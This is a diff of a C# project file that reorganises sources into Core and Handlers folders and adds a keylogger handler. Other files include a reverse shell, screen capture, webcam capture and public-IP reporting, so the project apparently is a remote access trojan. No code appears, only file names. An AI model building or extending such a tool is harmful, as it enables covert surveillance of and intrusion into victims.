@@ -70,6 +70,7 @@
     <Reference Include="System.Reactive.PlatformServices">
       <HintPath>..\packages\Rx-PlatformServices.2.2.5\lib\net45\System.Reactive.PlatformServices.dll</HintPath>
     </Reference>
+    <Reference Include="System.Windows.Forms" />
     <Reference Include="System.Xml.Linq" />
     <Reference Include="System.Data.DataSetExtensions" />
     <Reference Include="Microsoft.CSharp" />
@@ -77,14 +78,15 @@
     <Reference Include="System.Xml" />
   </ItemGroup>
   <ItemGroup>
-    <Compile Include="Bitmap.cs" />
-    <Compile Include="GetPublicIP.cs" />
-    <Compile Include="Messenger.cs" />
+    <Compile Include="Core\GetPublicIP.cs" />
+    <Compile Include="Handlers\Handler.cs" />
+    <Compile Include="Handlers\KeyLoggerHandler.cs" />
+    <Compile Include="Core\Messenger.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
-    <Compile Include="ReverseShellHandler.cs" />
-    <Compile Include="ScreenCaptureHandler.cs" />
-    <Compile Include="Tracker.cs" />
-    <Compile Include="WebcamHandler.cs" />
+    <Compile Include="Handlers\ReverseShellHandler.cs" />
+    <Compile Include="Handlers\ScreenCaptureHandler.cs" />
+    <Compile Include="Core\Tracker.cs" />
+    <Compile Include="Handlers\WebcamHandler.cs" />
   </ItemGroup>
   <ItemGroup>
     <None Include="app.config" />
